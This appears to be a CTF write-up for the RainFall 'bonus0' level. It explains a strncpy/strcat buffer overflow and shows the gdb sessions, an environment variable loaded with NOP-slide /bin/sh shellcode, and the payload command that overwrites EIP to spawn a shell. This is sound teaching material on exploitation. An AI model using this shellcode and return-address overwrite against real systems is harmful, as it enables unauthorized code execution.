# Bonus 0

In pp we can see that a string is read into a 4096 characters size buffer and a  NULL terminator is placed if there's a newline before 10 characters in and a call to strncpy.
`man strncpy` tells us that if there's no '\0' within n characters the string won't be NULL terminated. 
Which means we can blow past the 20 char limit and get strcat to return a + b + space char + b, overflowing the buffer in main.

```shell
(gdb) br *main+28
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
 -
aaaaaaaaaaaaaaaaaaaaa
 -
bb
Breakpoint 1, 0x080485c0 in main ()
(gdb) x/s $esp+0x16
0xbffff6e6:      'a' <repeats 20 times>, "bb bb"
(gdb) c
Continuing.
aaaaaaaaaaaaaaaaaaaaabb bb
[Inferior 1 (process 5768) exited normally]
```
We can see that the b string is repeated twice.

## Using the env
Let's put our [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html) after a safety NOP slide into the env, we'll try to replace its address with `EIP` afterwards.

```shell
export PWN=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```
Let's now get its address within gdb and add some margin, this will keep it working even if the env changes slightly.

```shell
bonus0@RainFall:~$ gdb -q ./bonus0 
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) r
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080485a7 in main ()
(gdb) p (char*)getenv("PWN")
$1 = 0xbffffd2c "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
```
The address of PWN in gdb's env is 0xbffffd2c, let's give ourselves a margin of 0x40 -> 0xBFFFFD6C.

Let's now replace EIP with that address.
```shell
bonus0@RainFall:~$ (python -c 'print "a"*20'; python -c 'print "b"*14 + "\x6c\xfd\xff\xbfa"'; cat -) | ./bonus0 
# The address is within the env to account for changes.
```
Bingo!
